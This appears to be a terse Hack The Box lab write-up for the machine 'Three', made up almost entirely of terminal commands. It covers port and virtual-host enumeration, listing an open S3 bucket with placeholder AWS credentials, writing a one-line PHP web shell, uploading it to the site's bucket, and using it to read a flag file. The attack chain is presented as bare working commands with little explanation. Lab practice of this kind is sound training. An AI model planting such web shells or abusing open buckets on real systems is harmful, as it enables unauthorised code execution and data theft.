# Three

### **Wed Mar 19 1:10PM**

```bash
nmap -sV -sV -p- 10.129.104.251

gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain

apt install awscli

┌──(kali㉿kali)-[/usr/share/seclists]
└─$ aws configure 
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp

┌──(kali㉿kali)-[/usr/share/seclists]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls                                           
2025-03-19 11:20:36 thetoppers.htb

┌──(kali㉿kali)-[/usr/share/seclists]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb                       
                           PRE images/
2025-03-19 11:20:36          0 .htaccess
2025-03-19 11:20:36      11952 index.php

┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php                                       

┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb             
upload: ./shell.php to s3://thetoppers.htb/shell.php              

┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ sudo nano /etc/hosts

thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt
```

PWN: [https://www.hackthebox.com/achievement/machine/2077152/489](https://www.hackthebox.com/achievement/machine/2077152/489)